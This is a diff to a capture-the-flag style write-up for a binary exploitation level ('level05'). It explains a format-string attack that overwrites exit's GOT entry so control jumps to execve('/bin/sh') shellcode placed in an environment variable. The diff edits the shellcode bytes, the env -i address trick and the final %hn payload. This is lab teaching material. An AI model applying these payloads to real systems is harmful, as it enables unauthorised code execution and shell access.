@@ -18,7 +18,7 @@ That way, when the program calls exit(), it actually jumps to our shellcode.
 ### 1. Prepare the shellcode
 We inject our shellcode using the environment :
 ```
-export SHELLCODE=$(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
+export SHELLCODE=$(python -c 'print "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"')
 ```
 
 We put the shellcode in the environment because when we tried to send the shellcode directly in the command gdb and ltrace didn't gave use the same address.
@@ -43,16 +43,25 @@ int main() {
 We compiles it with the flag `-m32` to get an address in 32 bits.
 ```
 gcc -m32 get_shellcode_addr.c
+env -i SHELLCODE=$SHELLCODE ./a.out
 ```
+
+By using `env -i`, we eliminate variability and make the address of our SHELLCODE variable stable and predictable. This ensure our exploit can reliably jump to the right address.
+
+Environment variables are stored in memory, and their address can vary depending on:
+- The number and size of other environment variables.
+- Their ordering.
+- The total memory layout of the process.
 
 ### 3. Locate the GOT entry for `exit`
 In gdb:
 ```
-(gdb) x/1w 0x080497e0
-0x080497e0 <exit@got.plt>: 0xffffd6b8
+disas exit
 ```
-We want to overwrite that address with the address of our shellcode.
+
+We want to overwrite this address with the address of our shellcode.
 Instead of writing all 4 bytes at once, we use two separate 2-byte writes using `%hn`.
+
 
 #### Why?
 Because:
@@ -63,7 +72,7 @@ Because:
 ### 4. The final payload
 We’ll use format string specifiers like `%hn` (half-word write) to write the shellcode address in 2-byte chunks.
 ```
-(python -c 'print "\xe2\x97\x04\x08" + "\xe0\x97\x04\x08" + "%55570d%11$hn" + "%9957d%10$hn"'; cat) | ./level05
+(python -c 'print "\xe2\x97\x04\x08" + "\xe0\x97\x04\x08" + "%55570d%11$hn" + "%9957d%10$hn"'; cat) | env -i SHELLCODE=$SHELLCODE ./level05
 ```
 
 Addresses:
@@ -77,11 +86,17 @@ Split into:
 - 0xd91a = 55578 (second half)
 - 0xffff = 65535, and 65535 - 55578 = 9957 (first half minus second half)
 
-We also need to subtract 8 bytes to the second half of the shellcode address because of the 8 bytes that we already write with the printf.
+We also need to subtract 8 bytes to the two half of the shellcode address because of the 8 bytes that we already wrote with the printf.
 
 So:
 - %55570d%11$hn → write 0xd91a at 0x080497e0
 - %9957d%10$hn → write 0xffff at 0x080497e2
+
+In gdb, we can check what is the value inside of the address of exit with this command:
+```
+(gdb) x/1w 0x080497e0
+0x080497e0 <exit@got.plt>: 0xffffd6b8
+```
 
 #### Why %10$hn, %11$hn?
 Because of how the stack is laid out, we need to calculate the positions where the addresses we inject land.
